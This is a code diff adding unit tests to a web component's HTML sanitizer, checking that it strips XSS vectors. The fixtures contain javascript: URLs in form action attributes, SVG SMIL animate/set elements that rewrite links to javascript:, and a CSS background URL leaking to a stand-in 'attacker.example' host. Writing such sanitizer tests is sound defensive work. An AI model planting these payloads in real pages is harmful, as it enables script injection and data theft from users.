@@ -525,5 +525,55 @@ describe('hx-prose', () => {
       expect(called).toBe(true);
       expect(el.querySelector('p')?.textContent).toBe('cleaned');
     });
+
+    it('sanitize on neutralizes javascript: in formaction/action', async () => {
+      // formaction/action fire a URL on form submission — same javascript: risk as href.
+      const el = await fixture<HelixProse>(
+        '<hx-prose sanitize><form action="javascript:alert(1)"><button formaction="javascript:alert(2)">go</button></form></hx-prose>',
+      );
+      await el.updateComplete;
+      expect(el.innerHTML.toLowerCase()).not.toContain('javascript:');
+    });
+
+    it('sanitize on strips SVG SMIL animation elements (<animate>/<set>)', async () => {
+      // SMIL can rewrite xlink:href to a javascript: URL at runtime, defeating the
+      // static URL-scheme check; the elements themselves must be removed.
+      const el = await fixture<HelixProse>(
+        '<hx-prose sanitize><svg viewBox="0 0 1 1"><a><animate attributeName="xlink:href" to="javascript:alert(1)" begin="0s" /><set attributeName="href" to="javascript:alert(2)" /><rect width="1" height="1" /></a></svg></hx-prose>',
+      );
+      await el.updateComplete;
+      expect(el.querySelector('animate')).toBeNull();
+      expect(el.querySelector('set')).toBeNull();
+      expect(el.innerHTML.toLowerCase()).not.toContain('javascript:');
+    });
+
+    it('sanitize on strips inline style attributes (CSS-injection backstop)', async () => {
+      const el = await fixture<HelixProse>(
+        '<hx-prose sanitize><p style="background:url(https://attacker.example/?leak)">x</p></hx-prose>',
+      );
+      await el.updateComplete;
+      expect(el.querySelector('p')?.hasAttribute('style')).toBe(false);
+    });
+
+    it('a non-idempotent custom sanitizer does not loop (observer detached during rewrite)', async () => {
+      // A sanitizer that mutates on every call would re-trigger the MutationObserver
+      // forever if the observer were live during the rewrite. The detach makes it
+      // converge: it runs a bounded number of times, not unbounded.
+      const el = await fixture<HelixProse>('<hx-prose sanitize><p>x</p></hx-prose>');
+      await el.updateComplete;
+      let calls = 0;
+      // Always returns DIFFERENT markup (appends a comment) so cleaned !== original
+      // on every pass — the worst case for re-entrancy.
+      el.sanitizer = (html: string) => {
+        calls += 1;
+        return `${html}<!--n${calls}-->`;
+      };
+      await el.updateComplete;
+      // Let any queued observer microtasks drain.
+      await new Promise((resolve) => setTimeout(resolve, 0));
+      await new Promise((resolve) => setTimeout(resolve, 0));
+      // Without the detach this would be unbounded; with it, it does not run away.
+      expect(calls).toBeLessThan(10);
+    });
   });
 });
